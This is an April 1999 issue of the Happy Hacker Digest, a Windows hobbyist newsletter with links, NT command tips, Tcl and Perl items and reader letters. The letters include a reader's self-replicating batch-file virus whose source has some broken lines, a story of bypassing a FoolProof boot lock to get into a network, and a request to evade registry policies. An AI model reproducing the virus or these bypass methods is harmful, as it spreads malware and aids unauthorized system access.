@@ -1,0 +1,619 @@
+April 2, 1999 
+_______________________________________________________________________ 
+Visit the Happy Hacker site at 
+http://www.happyhacker.org 
+_______________________________________________________________________
+
+Opening Comments 
+URLs 
+Reader Submissions 
+Useful NT Commands 
+'Hacking' Win9x 
+Hacking Philes 
+Linux and Win9x 
+TCL/Tk Programming 
+Perl Corner 
+Editor's Comments
+
+****************************************************************** 
+Opening Comments
+
+Wow.  Things have really slowed down...I haven't been getting 
+as many emails regarding subjects for the HHD.  I haven't received 
+a single submission or request for the Perl Corner!
+
+I have received emails asking me about changing the login splash 
+screen on 98...but I can't answer them.  I don't have 98.  No 
+reader has sent me a URL that describes how to do this stuff.  And 
+frankly, I am just not interested...if I had a URL, I would 
+post it.
+
+Here are some tips for submissions and questions... 
+1.  Avoid 'leet skript. 
+2.  Don't divulge a lot of personal information...I don't want 
+to know that you are a 15 yr old male in Argentina. 
+3.  Be clear as to your question or submission. 
+4.  DO NOT ask me to teach you to 'hack' or to 'hack' into a system. 
+5.  Use correct spelling and grammar. 
+6.  If you are going to respond to a Reader Submission, make sure 
+that you include the original poster in the To: block.  I am not 
+a mail relay service.
+
+****************************************************************** 
+URLs
+
+matti@zh.wings.ch sends this one in for sources of programming 
+info (Thanks, Matti!): 
+http://www.itlibrary.com
+
+Watch out, Microsoft is at it again!  Thanks to TiberianSon, 
+<tiberian@icdc.com>: 
+http://cnnfn.com/digitaljam/9903/07/microsoft/
+
+Well, if that last URL bothers you, check out: 
+http://www.vecdev.com/guideon.html
+
+Some great NT security stuff, plus the latest exploit for 
+getting 'Admin' on NT: 
+http://www.cybermedia.co.in/
+
+Want to scan your machine for viruses by accessing a web 
+page?  I got some email from an alleged McAfee employee, 
+who gave me this URL: 
+http://clinic.mcafee.com
+
+For the Linux user - check out the Linux Gazette... 
+http://www.ssc.com/lg/
+
+Want to learn to install Linux?  Check out CNN... 
+http://cnn.com?/TECH/computing/9903/18/startlinux.idg/
+
+****************************************************************** 
+Reader Submissions
+
+From:  anRky <anrky@linex.com> 
+Subj:  Links for computer forensics
+
+I have a page that lists a few computer forensic/data recovery 
+sites.
+
+http://members.aol.com/morpheus1b/temp1.htm
+
+Hope this helps and keep up the excellent work on the digest.
+
+-anRky
+
+############### 
+anrky1@aol.com
+
+Visit anRky's Chronicles of Hacking 
+http://members.aol.com/anrky1/chron.htm
+
+anrky@linex.com
+
+[Editor:  Hey, maybe it's worth checking out...]
+
+From:  "Max Andersen" <unibomber_98@hotmail.com>
+
+Hi. I have some questions for you all. If possible, could you 
+publicise  it on the hacker's list, so everyone can read it 
+and help me with my queries.
+
+I have Raising.exe, and Handsoff.exe (security programs) 
+installed on our computers which are set up by a LAN, and 
+I can not get into Windows as a result of losing my password 
+and user name.  Also, I can not delete these programs, becuase 
+the computers don't check for a floppy disk when it boots up, 
+therefore, can not use a boot disk to do what I thought would work. 
+Would you please help me with my queries? 
+Thank you for your time and support.
+
+[Editor:  I always wonder what causes folks to choose the nicks 
+they choose...]
+
+From:  "Total DiStortion" <totaldis@flinet.com>
+
+Have a little story to tell ya `bout FoolProof.
+
+My friend was trying to get rid of BootLock (part of 
+FoolProofs internal BootLocker) because he wanted to look 
+around the network a little without any access, but since he's 
+not as skilled as he hoped he actually pulled the master boot 
+record off of the drive w/ "fdisk /mbr" so in turn I had to fix 
+it before the admin found out.  What I had done was reset the 
+Master Boot Record back to normal w/ linux's fdisk, thus giving 
+me no bootlock and full access to the system.  Just thought I'd 
+let you know so if you would like to put it in a foolproof section 
+of some kind your users or "subscribers" could have more ways to 
+work around FoolProof. 
+        -Total_DiS
+
+[Editor:  Okay...but I see two things happening...either you 
+get booted off of the systems for doing things like this, or 
+they make you the sysadmin, and make you deal with things like 
+this.  Maybe instead of doing things like this you could sort of 
+help the sysadmin out and figure out how to prevent such things.]
+
+From:  "94WILSONP20" <94WILSONP20@marling.gloucs.sch.uk> 
+Subj:  Batch files
+
+Hi. 
+I seem to ask a lot from you good people but never contribute 
+myself. So, here I am trying to contribute.
+
+I was just reading your turorial on Batch files. I was wondering 
+if you would like a copy of my batch file.
+
+It is a Virus, but there is no "payload" and there fore all it 
+does is copy it's code to the end of all the batch files in current 
+dierctory.
+
+-----------virii.bat 
+@echo off>nul.virii 
+REM Bay 47's batch virii demo. By Paul Wilson 
+REM Please not this is a virus. It has the string virii on 
+REM all lines that are to be copied
+
+if exist %0.bat set virii=%0.bat 
+if exist %0 ste virii=%0 
+if !%1==!  goto virii_start 
+if %1==/infect goto virii_infect 
+if %1==/find goto virii_find
+
+:virii_start 
+REM Will find all batch files in current diectory 
+echo Finding files to infect with virii 
+for %%a in (*.bat) do command /e:10000 /c %virii% /infect %%a
+
+goto virii_end
+
+:virii_infect 
+REM This part makes sure virii does not infect itself or 
+REM previoulsy infected files 
+echo Checking %2 and making sure it has not been previously infected 
+set file_virii=%0 
+find "file_virii=%0" <%2>viriix.bat 
+call viriix 
+del viriix.bat 
+if "%file_virii%=="viriix echo %2 is allready infected 
+if "%file_virii%--"viriix exit 
+REM End of check
+
+echo The virii is now infecting %2 
+type %2 > viriix.bat 
+find "virii" <%virii%>> viriix.bat
+
+goto virii_end
+
+:virii_end
+
+I don't know what use this could be apart from an example of 
+redirecting outputs and "for" commands
+
+[Editor:  Hey, innovation by the readers is always welcome!]
+
+From:  RavenBlack <raven@ravenblack.net> 
+Subj:  Recycle icon question
+
+A webpage that's helpful with all things iconic and otherwise 
+irritating-desktop related is: 
+http://www.annoyances.org/ 
+It details how to change those icons, how to change the bootup 
+and shutdown screens, and various other little things that so 
+many people find annoying about Windows.
+
+--RavenBlack 
+raven@ravenblack.net 
+ICQ 3105892 
+http://www.ravenblack.net/
+
+[Editor:  I hope this puts a stop to all the 'how do I change 
+my ??? on win95' emails...]
+
+From:  TCB <aristeus@uswest.net> 
+Subj:  Batch clean
+
+Greetings,
+
+        I've tested this batch file on Windows95 4.00.950B and on 
+DOS 6.21 compare the output of this batch with the output produced 
+by running 'list.bat' followed by 'clean.pl' from the Feb. 23, 1999 
+issue of the HH Digest:
+
+** Usage:  list2 [STARTDIR]  (For C:\ use "list2 C:") ** 
+** When the /S AND the /B switches are added to 'dir' ** 
+** it gives the full pathname of the file.            ** 
+** /S includes subdirectories under [STARTDIR]        ** 
+** /B is for 'bare format'(i.e.- no header, no footer)** 
+** /L switches output to lowercase(not necessary).    **
+
+-----  begin list2.bat  ----- 
+@ECHO OFF 
+dir %1\*.com /s /b /l > master2.txt 
+dir %1\*.exe /s /b /l >> master2.txt 
+dir %1\*.sys /s /b /l >> master2.txt 
+-----  end list2.bat  -----
+
+Extremely simple...so much so that I'm glad you didn't solve 
+your problem this way, since there was much more to be learned 
+in your clean.pl script(Which was a nice piece of work, BTW). 
+As I mentioned, I've only tested this on 95B and DOS 6.21, 
+so if it doesn't produce the correct resultant file, please 
+let me know which version of Windows you are running.
+
+Sincerely, 
+        -TCB.
+
+[Editor:  Again...anytime a reader submits something of use, 
+it's welcome...]
+
+From:  "Dan peterson" <dan_135@hotmail.com> 
+Subj:  poledit
+
+I was wondering if there is anyway to get by policies set by 
+poledit.  for example say registry editing is disabled, is 
+there anyway to run regedit although this policy is set. I've 
+tried running it throguh IE ,  but no luck. 
+Any help would be appreciated 
+thanx 
+Dan
+
+[Editor:  Please direct responses to Dan...]
+
+From:  "J. Charles Ogwyn" <Webmaster@WeWill.com> 
+Subj:  Question about IP address
+
+I have been reading the HH Digest for quite some time and I 
+have a question.  Recently I have come across several URLs 
+with an address format that I haven't seen before.  I would 
+like to know what it is called, and how it is derived from a 
+domain name or IP number.  For example the following url 
+http://3505003744/ turns out to be 
+http://208.234.28.224/ which is 
+http://www.srointernet.com/  Thanks.
+
+[Editor:  Okay, on this one, please include me in the CC: 
+block when you answer Chuck.  I've never seen the address 
+he describes, but it works...]
+
+****************************************************************** 
+Useful NT Commands
+
+Believe it or NoT (hee hee), NT has some pretty usefull commands 
+that behave in much the same way as similar commands on Unix. 
+We'll take a look at a few of the commands...and keep in mind 
+that there is no substitute for your own experimentation.  Most 
+of these commands are command line tools, which means that they 
+can be placed in batch files, used in Perl scripts, and you can 
+get information on their usage by typing '/?' following the 
+command.  Also, if you choose Start -> Help -> Contents -> 
+Windows NT Commands, you will see a listing of the various 
+commands available, with explanations and examples. 
+ 
+
+call 
+This command is used to call one batch file from another (wow, 
+that's exactly what it says in the Help!!).  Keep in mind that 
+the file called must have a .bat or .cmd extension.  You can use 
+this in a conditional check batch file...if one condition is 
+met, call another batch file...
+
+Filter commands (find, more, sort) 
+These commands work in a manner similar to the way they work on 
+Unix.  An example of the use of 'find' can be seen in a previous 
+edition of the HHD...we wanted to use netstat to see if NetBus or 
+BO were installed on our system, so we used the following command:
+
+netstat -a | find "12345"
+
+This command pipes the output of 'netstat -a' through the filter 
+command 'find', looking for the string '12345'.  If we get a 
+response from the command, then we might have NetBus installed on 
+our system!
+
+findstr 
+This command is similar to grep, found on Unix systems.  There 
+are far too many switches for this command to be listed here... 
+read through your online Help to see what they are.  You can use 
+this command to search for all instances of a particular string 
+of characters in a file, or a series of files.  Findstr even 
+responds to the wildcard, so you can choose '*.txt' or '*' as 
+the files to search.  You can even recurse subdirectories using 
+the '/s' switch.  Note:  If you want to find the number of times 
+a string appears in a file, then use the 'find' command, with the 
+'/c' switch.
+
+xcopy 
+If you want to copy a large number of files, such as entire 
+directories, from one location to another, take a look at xcopy.
+
+pax 
+If you administrate a heterogenous environment (ie, NT and Unix) 
+then you might consider the pax command.  It's used to read and 
+write archive files which conform to the Archive/Interchange File 
+Format specified in IEEE Std. 1003.1-1988.  What does all that 
+mean?  Well, according to the documentation, pax supports V7 tar 
+and System V binary cpio format archives.
+
+mem 
+Displays information about allocated memory areas.
+
+pentnt 
+Checks your processor to see if you have the Intel floating 
+point bug.
+
+start 
+Creates a separate window to run a program.  This is usefull if 
+you want to run a command, but you don't want to open a separate 
+command prompt to do so.
+
+Next time, we'll take a look at some of the networking commands.
+
+****************************************************************** 
+'Hacking Win9x'
+
+With all the email about modifying this or that on Win9x, I 
+wanted to pass on this site...check out WinTrasher Gold.  From 
+the write-up, it sounds pretty good...
+
+http://www.silents.dk/iindex.html
+
+****************************************************************** 
+Hacking Philes
+
+While visiting one of the sites that I visit regularly, I ran 
+across a couple of very interesting files that are definitely 
+worth the time it takes to read them.  They are from Eric 
+Raymond (URLs wrap...):
+
+How to become a hacker 
+http://www.genocide2600.com/~tattooman/hacking-textfiles/ 
+hacker-howto.html
+
+A brief history of hackerdom 
+http://www.genocide2600.com/~tattooman/hacking-textfiles/ 
+hacker-hist.html
+
+The Loginataka 
+http://www.genocide2600.com/~tattooman/hacking-textfiles/ 
+loginataka.html
+
+Here's another file, not by Mr. Raymond, called the "Anatomy 
+of an attack": 
+http://www.genocide2600.com/~tattooman/infosec-faq/ 
+anatomy.of.attack.txt
+
+****************************************************************** 
+Linux and Win9x
+
+Okay, I know that this is supposed to be the Windows HHD, but I 
+have been getting email asking me about Linux this, Linux that, 
+and what kind of Unix you can run with 95, blah, blah, blah. 
+If those of you who are sending me these emails REALLY have been 
+reading the Digests for as long as you say...well, keep reading! 
+I thought I would pull together a couple of quick resources, 
+so that you can now pester the Unix editor instead of me!!
+
+In order to learn how to do anything with Linux, the best place 
+to start is with the Linux Documentation Project...which is really 
+easy to find if you start at Yahoo!  The LDP maintains a list of 
+HOWTOs, which tell you 'how to' do a lot of things with Linux. 
+If you are especially interested in running Win95 and Linux, check 
+out the two mini-HOWTOs:
+
+Linux+Win95 mini-HOWTO
+
+and
+
+Loadlin+Win95 mini-HOWTO
+
+I offer no review, nor do I guarantee your success with them.  I 
+am only offering them up as resources.
+
+Now, if you are interested in running Win95 and Linux, but you 
+don't want to bother with repartitioning your hard drive (REAL 
+men repartition!!), then check out:
+
+http://www.slackware.com/zipslack
+
+I won't say any more...other than this...if you want to use 
+Linux on the Internet, you'll probably have to install PPP from 
+the 'Packages' section.
+
+Here's my challenge...I'd like to see a couple of readers go 
+ahead and set up their systems using ZipSlack.  Install PPP and 
+X-Windows, and whatever else.  Clearly document every step _exactly_ 
+as you set up ZipSlack, and put it all on a web page when you're 
+done.  Then send me the URL, so I will post it here in the HHD.
+
+If you choose to try and install ZipSlack, or any other Linux, don't 
+contact me for help.  I won't have it.  But if you do get it 
+installed, put the steps on a web page, and send me the URL.
+
+Of course, this is in addition to all previous references to 
+Trinux...http://www.trinux.org.
+
+****************************************************************** 
+TCL/Tk Programming
+
+You're probably asking yourself...why is another programming or 
+scripting language being introduced in the Windows edition of the 
+HHD?  Okay, I'll reiterate the old adages of helping you to help 
+yourself, blah, blah, blah.  But here's another reason...TCL and 
+Perl come with Linux for free, and are originally from the Unix 
+platform.  So if you learn a little bit about either of the 
+languages on Win32, you can not only increase your knowledge of 
+Win32 systems, but you can also prepare yourself for Linux and 
+Unix-based systems.  If you write your scripts, and provide 
+comments such as 'this is how it's done on Win32, and here's how 
+it's done on Linux', you will not only have cross-platform tools, 
+but you'll have skills and knowledge that you can carry over to 
+other platforms.
+
+What is TCL/Tk?  Well, TCL stands for 'tool command language' and 
+was originally written to standardize the command language used 
+in a research project.  In my endeavor to learn more about this 
+little gem, and to see if it runs on Win32 systems, such as 95 
+and NT, I started my search at...Yahoo!  For information on the 
+history of TCL, right from the creater, John Ousterhout, check 
+out: 
+http://www.scriptics.com/scripting/tclHistory.html
+
+NOTE:  The Scriptics site also has a wealth of information 
+regarding TCL...introduction to programming, a style guide, 
+white papers, man pages, etc.  If you need a tutorial, 
+check out: 
+http://www.msen.com/~clif/TclTutor.html
+
+I quickly found out that Scriptics (http://www.scriptics.com/) 
+has the downloadable binaries for Win32 systems...for free! 
+http://www.scriptics.com/software/8.0.html#Download Binary
+
+Installation is a snap.  You may choose to install the binaries 
+into a directory other than the default of 'c:\program files\ 
+tcl'...I chose 'c:\Tcl'.
+
+For lots of info, check out: 
+http://www.sco.com/Technology/tcl/Tcl.html
+
+Here's a FAQ for TCL/Tk on Windows: 
+http://www.pconline.com/~erc/tclwin.htm
+
+Use TCL/Tk for web programming: 
+http://wwwwseast2.usec.sun.com/960710/cover/index.html
+
+Here's an interesting little script that was sent to me, 
+one that prompted me to look into TCL/Tk...imagine 
+that, a reader submission!!
+
+Submitted by: "dave andrews" <dave31_5@hotmail.com> 
+#---------------START------------------------# 
+# Requires a Tcl/Tk interperator (WISH) 
+# Just save this as a .tcl file on your computer and double 
+# click on its name in Windows explorer.
+
+. configure -width 420 -height 155
+
+set label1 [label .l1 -text "Router:"] 
+set mailhost1 [entry .e1 -textvariable host1] 
+set label2 [label .l2 -text "From:"] 
+set mailfrom1 [entry .e2 -textvariable from1] 
+set label3 [label .l3 -text "To:"] 
+set mailto1 [entry .e3 -textvariable to1] 
+set label4 [label .l4 -text "Message:"] 
+set mailmessage1 [entry .e4 -textvariable message1]
+
+set txt2 [text .t2 -height 11 -width 35 -background grey \ 
+              -tabs {2.5i right 3i left 5.8i numeric} \ 
+              -wrap word]
+
+$txt2 insert end "Computer response..."
+
+set exitbutton [button .exitbutton -text "Exit" -command "exit"]
+
+set sendbutton [button .s1 -text "Send E_Mail" -command { 
+set mailhost $host1 
+set mailfrom $from1 
+set mailto $to1 
+set mailclient [socket $mailhost 25] 
+set message $message1
+
+puts $mailclient "mail from: $mailfrom" 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n"
+
+puts $mailclient "rcpt to: $mailto" 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n"
+
+puts $mailclient "data" 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n"
+
+puts $mailclient "$message" 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n"
+
+puts $mailclient "." 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n"
+
+puts $mailclient "quit" 
+flush $mailclient 
+set line [gets $mailclient] 
+$txt2 insert end "Reply: $line \n" }]
+
+place $label1 -x 0 -y 2 
+place $mailhost1 -x 52 -y 2 
+place $label2 -x 0 -y 30 
+place $mailfrom1 -x 52 -y 30 
+place $label3 -x 0 -y 60 
+place $mailto1 -x 52 -y 60 
+place $label4 -x 0 -y 90 
+place $mailmessage1 -x 52 -y 90 
+place $sendbutton -x 2 -y 120 
+place $exitbutton -x 100 -y 120 
+place $txt2 -x 200 -y 0 
+#-----------------------------END-------------------------#
+
+Assuming that you installed TCL in the directory 'c:\tcl', 
+you can run the above script by adding the line:
+
+#! c:\tcl\bin\wish80.exe
+
+...to the very beginning of the script...it MUST be the first 
+line of the script.  Once you save the script as 'test.tcl', 
+just type:
+
+test.tcl
+
+at the command prompt.  Then a nice GUI window opens up!
+
+****************************************************************** 
+Perl Corner
+
+Perl Network Programming article from the Linux Journal 
+http://www.linuxjournal.com/current/3237.html
+
+That's it for this Perl Corner...really.  I've been doing some 
+Perl programming for work...and I can't present scripts in their 
+entirety here (copyright issues).  Maybe when I am done, I can 
+present snippets of scripts that you might find useful.  For 
+future editions of the HHD, it might be useful if you were to 
+send me submissions or requests...
+
+****************************************************************** 
+Editor's Comments:
+
+Well, that's it for now.  I hope to hear from readers in the 
+future...but please don't ask me about changing the login splash 
+screen on 98... 
+_______________________________________________________________________ 
+
+    
+ 
+
+This is a list devoted to *legal* hacking! If you plan to use any 
+information in this Digest or at our Web site to commit crime, go away! 
+Foo on you! Don't email us bragging about any crimes you may have committed. 
+We mean it. 
+
+For Windows questions, email keydet89@yahoo.com or editor@techbroker.com 
+For Unix questions, contact unixeditor@techbroker.com. 
+For Macs, email Strider <s.corinth@iname.com> 
+
+Happy Hacker staff: Unix editor, <unixeditor@techbroker.com>; 
+Windows editor, Keydet89 <editor@techbroker.com>; postmasters Jonathan D. 
+Zerulik and William Lewis <>; Hacker Wargame Director, 
+Vincent Larsen <vincent@sage-inc.com>; Wargame Sysadmin, Satori 
+<Satori@rt66.com>; Webmaster, Diode <webmaster@happyhacker.org>; Clown 
+Princess: Carolyn Meinel <>
+
+Happy Hacker is a 501 (c) (3) tax deductible organization  
+in the United States operating under Shepherd's Fold Ministries. Yes!  
+This is all a plot to save your immortal souls!
